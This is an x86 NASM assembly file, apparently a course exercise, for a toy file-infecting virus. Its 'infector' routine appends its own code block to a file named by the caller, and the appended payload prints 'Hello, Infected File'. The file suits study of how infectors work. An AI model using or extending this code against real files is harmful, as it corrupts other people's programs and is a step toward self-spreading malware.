%define stdout          1

%define syscall_exit    1
%define syscall_write   4

%define O_WRONLY        0x1
%define O_APPEND        0x400


section .text
    virus_msg: db "Hello, Infected File", 0x0A, 0
    len_virus_msg: equ $-virus_msg
    virus_attached: db "VIRUS ATTACHED", 0x0A, 0
    len_virus_attached: equ $-virus_attached
    new_line: db 0x0A, 0
    

section .text

global _start
global system_call
global infection
global infector 

extern main
extern strlen

_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,syscall_exit
    int     0x80
    nop


system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller


code_start:


infection:  
    push    ebp
    mov     ebp, esp
    pushad

    mov     edx, len_virus_msg
    mov     eax, syscall_write
    mov     ebx, stdout
    mov     ecx, virus_msg

    int     0x80

    cmp     eax, 0
    jle     infection_error

    popad
    pop     ebp
    ret


infection_error:
    popad
    pop ebp
    mov eax, 1
    mov ebx, 0x55
    int 0x80


infector:
    push ebp
    mov ebp, esp
    sub esp, 4     

    pushad ; save state

    ; 1) print the given filename
    push dword [ebp+8]
    call strlen
    add esp, 4

    mov edx, eax
    mov ecx, [ebp+8]
    mov ebx, stdout
    mov eax, syscall_write
    int 0x80

    mov edx, 1
    mov ecx, new_line
    mov ebx, stdout
    mov eax, syscall_write
    int 0x80

    cmp eax, 0
    jle error

    ; 2) open the file
    mov eax, 5
    mov ebx, [ebp+8]
    mov ecx, O_WRONLY | O_APPEND
    mov edx, 0777
    int 0x80

    cmp eax, -1
    je error

    mov [ebp-4], eax

    ; 3) add the code
    mov eax, 4
    mov ebx, [ebp - 4]
    mov ecx, code_start
    mov edx, code_end
    sub edx, code_start
    int 0x80

    cmp eax, 0
    jle error

  ; 4) close the file
    mov eax, 6
    mov ebx, [ebp - 4]
    int 0x80

    cmp eax, -1
    je error

    mov edx, len_virus_attached
    mov ecx, virus_attached
    mov ebx, stdout
    mov eax, syscall_write
    int 0x80

    popad

    add esp, 4
    pop ebp
    ret


error:
    popad
    add esp, 4
    pop ebp
    mov eax, 1
    mov ebx, 0x55
    int 0x80


code_end:
